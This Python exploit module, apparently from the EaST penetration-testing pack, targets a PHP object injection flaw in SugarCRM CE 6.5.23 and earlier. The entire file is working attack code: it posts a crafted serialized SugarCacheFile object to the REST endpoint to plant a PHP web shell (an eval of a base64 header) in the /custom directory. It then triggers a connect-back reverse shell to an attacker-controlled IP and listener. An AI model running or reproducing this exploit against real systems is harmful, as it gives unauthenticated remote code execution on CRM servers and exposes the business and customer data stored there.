#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

from collections import OrderedDict
import urlparse
import urllib
import urllib2
import base64
from shellcodes.Shellcodes import CrossOSShellcodes

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "sugarcrm_rest_deserialize_code_exec"
INFO['DESCRIPTION'] = "SugarCRM Rest Deserialize Code Execution"
INFO['VENDOR'] = "http://www.sugarcrm.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23 which could be abused to allow
unauthenticated users to execute arbitrary PHP code with the permissions of the webserver. The dangerous unserialize()
call exists in the '/service/core/REST/SugarRestSerialize.php' script. The exploit abuses the __destruct()
method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory.
Tested against SugarCRM CE 6.5.23 on Windows 7 SP1 x64.
    """
INFO["DOWNLOAD_LINK"] = "https://www.exploit-db.com/apps/12a23b5c52bfef86e3338f2eb212f0ba-SugarCE-6.5.23.zip"
INFO["LINKS"] = ['http://karmainsecurity.com/KIS-2016-07', 'http://www.sugarcrm.com/security/sugarcrm-sa-2016-001']
INFO['CHANGELOG'] = "7 Sep, 2016. Written by Gleg team."
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 81
OPTIONS["SSL"] = False
OPTIONS["BASEPATH"] = "/sugarcrm"
OPTIONS["CONNECTBACK_IP"] = "192.168.1.110"



class exploit(Sploit):
    def __init__(self, host='', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS["HOST"])
        self.port = self.args.get('PORT', OPTIONS["PORT"])
        self.path = self.args.get('BASEPATH', OPTIONS["BASEPATH"])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.connectback_ip = self.args.get('CONNECTBACK_IP', OPTIONS["CONNECTBACK_IP"])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log("Please enable listener to recieve connection from remote shell")
            self.finish(False)
        proto = "https" if self.ssl else "http"
        self.url = urlparse.urljoin("{}://{}:{}/".format(proto, self.host, self.port), self.path)

    def create_shell(self):
        s = CrossOSShellcodes(self.connectback_ip, self.listener_port)
        shell = s.create_shellcode('php').replace("<?php", "").replace("?>", "")
        return base64.b64encode(shell)

    def run(self):
        self.args()
        self.log("[*] Trying to upload php code...")
        upload_php = '/custom/' + self.random_string(10) + '.php'
        rest_data = ("O:+14:\"SugarCacheFile\":23:{S:17:\"\\00*\\00_cacheFileName\";"
                     "s:%s:\"..%s\";S:16:\"\\00*\\00"
                     "_cacheChanged\";b:1;S:14:\"\\00*\\00_localStore\";a:1:{i:0;s:55"
                     ":\"<?php eval(base64_decode($_SERVER['HTTP_PAYLOAD'])); ?>\";}}")
        rest_data = rest_data % (len(upload_php) + 2, upload_php)
        post_data = {
            'method': 'login',
            'input_type': 'Serialize',
            'rest_data': rest_data
        }

        rest_url = self.url + '/service/v4/rest.php'
        res = urllib2.urlopen(rest_url, urllib.urlencode(post_data))
        if not res or res.code != 200:
            self.log("[-] Exploit failed")
            self.finish(False)
        self.log("[+] Success")
        self.log("[*] Trying to execute payload...")
        shell_url = self.url + upload_php
        request = urllib2.Request(shell_url, None, {"payload": self.create_shell()})
        res = urllib2.urlopen(request)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()